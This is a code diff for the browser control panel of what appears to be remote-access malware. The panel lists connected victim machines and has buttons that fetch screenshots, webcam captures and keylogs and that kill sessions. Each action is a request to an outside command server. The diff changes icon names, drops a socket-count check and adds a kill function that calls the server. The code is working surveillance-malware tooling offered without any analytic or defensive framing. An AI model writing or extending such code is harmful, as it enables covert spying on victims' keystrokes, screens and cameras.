@@ -12,16 +12,16 @@ function display() {
       <span>${socket.host}</span>
       <span>${socket.name}</span>
       <span>${socket.os}</span>
-      <ion-icon name="desktop-filled" onclick="image('${socket.id}', 'screenshot')"></ion-icon>
-      <ion-icon name="camera-filled" onclick="image('${socket.id}', 'webcam')"></ion-icon>
-      <ion-icon name="recepit-filled" onclick="text('${socket.id}', 'keylog')"></ion-icon>
-      <ion-icon name="skull-filled" onclick="kill('${socket.id}')"></ion-icon>
+      <ion-icon name="desktop-outline" onclick="image('${socket.id}', 'screenshot')"></ion-icon>
+      <ion-icon name="camera-outline" onclick="image('${socket.id}', 'webcam')"></ion-icon>
+      <ion-icon name="receipt-outline" onclick="text('${socket.id}', 'keylog')"></ion-icon>
+      <ion-icon name="skull-outline" onclick="kill('${socket.id}')"></ion-icon>
     </div>`
   }
 }
 
 setInterval(() => {
-  if(SOCKETS_N != JSON.parse(get('https://gate-serv.kitsuforyou.repl.co/sockets')).length) display()
+  display()
 }, 1000)
 
 function image(id, method) {
@@ -34,4 +34,10 @@ function text(id, method) {
   let url = `https://gate-serv.kitsuforyou.repl.co/do/${method}/${id}`
   let res = JSON.parse(get(url)).rawtext || "No text found"
   document.querySelector('#render').innerHTML = `<p class="render-text">${res}</p>`
+}
+
+function kill(id) {
+  let url = `https://gate-serv.kitsuforyou.repl.co/do/kill/${id}`
+  get(url)
+  alert('correctly killed')
 }
